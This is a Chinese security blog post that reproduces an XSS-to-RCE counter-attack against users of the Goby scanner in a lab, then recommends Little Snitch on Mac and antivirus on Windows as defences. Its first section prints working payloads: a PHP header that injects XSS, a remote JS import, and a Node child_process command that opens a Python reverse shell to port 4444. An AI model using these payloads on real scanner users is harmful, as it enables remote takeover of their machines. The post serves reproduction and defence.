---
title: 反制 Goby RCE 复现及 Mac 用户防御策略
date: 2021-08-13 15:35:45
id: 210813-153545
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210813150936.png
tags:
- 防御
- 反制
- RCE
categories:
- 经验总结
---

# 0x00 前言

最近看到网上反制 Goby 的文章，而自己平时 Mac 一直是裸奔的状态，这下整的自己有点慌了，这里就来记录下反制 Goby RCE 的复现以及 Mac 用户的防御策略。

# 0x01 反制 Goby RCE 复现

## XSS

为了方便，这里直接使用 PhpStudy 了，这里的 PhpStudy 地址为 http://172.16.214.4 ，直接将 Web 服务里的 index.php 改为以下内容。

```
<?php
header("X-Powered-By: PHP/<img	src=1	onerror=alert(\"TeamsSix@WgpSec\")>");
?>
```

Goby 在扫描到 http://172.16.214.4 后，点击扫描结果里的 172.16.214.4  就会弹窗了。

> 注意扫描结果里一定要点击对应的 IP 才行，比如我这里的 IP 是 172.16.214.4，不然是触发不了的

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210813145503.png)

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210813144712.png)

## RCE

RCE 需要再新建一个 js 文件，这里我在 172.16.214.4 的 www 目录下新建了一个名为 mac 的 js 文件，js 内容如下：

```
(function(){
require('child_process').exec('open /System/Applications/Calculator.app');
require('child_process').exec('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.214.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
})();
```

执行这段 JS 会在本地打开计算器，并利用 Python 反弹 Shell 到 172.16.214.4 主机的 4444端口。

之后将 index.php 修改如下：

```
<?php
header("X-Powered-By: PHP/<img	src=1	onerror=import(unescape('http%3A//172.16.214.4/mac.js'))>");
?>
```

172.16.214.4 上使用 NC 开启 4444 端口监听后，Goby 开启扫描，点击扫描结果里的 172.16.214.4 的详细信息，成功反弹 Shell.

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210813150226.png)

# 0x02 Mac 用户防御策略

裸奔的 Mac 真的是一反弹一个准，太没安全感了，于是在师傅们的推荐下，入手了 little snitch，little snitch 官网链接：[https://www.obdev.at/products/littlesnitch](https://www.obdev.at/products/littlesnitch)

> 声明下这个不是广告啊，只是分享下自己在 Mac 中的防御方法而已

little snitch 可以用来监控 Mac 中所有的联网行为，界面长这个样子，个人觉着还是挺漂亮的。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210813151240.png)

实测下来，还是不错的，即使在 Silent 模式下，当监测到有异常连接行为时也会告警，在使用过程中也是能成功拦截到反弹 Shell 请求的。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210813150936.png)

不过 little snitch 是付费的，个人觉着买个家庭装是比较划算的，家庭装支持 5 台设备，几个小伙伴拼个单，每个人约合 94 元，另外这个比较良心的是它这个有效期是永久的。

一向习惯了白嫖的我，想了想为了安全考虑还是剁手了，毕竟我可不想那天被反制了，要是被反制了那就 GG 了。

说到这里也许会有人好奇，为啥不说说 Windows 用户的防御策略，于是我自己实际测试了一下，发现在 Windows 下装个杀软就行了，这里以火绒为例，当监测到反弹 Shell 动作时，火绒会直接弹出告警，所以感觉 Windows 就没啥好说的了。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210813143544.png)

好了，这篇文章就到这里了，在此没有过多赘述产生原因细节等，因为主要是想分享下自己的防御策略，具体的漏洞细节参考下面的参考文章即可。

> 参考文章：
>
> [https://mp.weixin.qq.com/s/tl17-Qz-VXpSlZtZWDgeHg](https://mp.weixin.qq.com/s/tl17-Qz-VXpSlZtZWDgeHg)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)
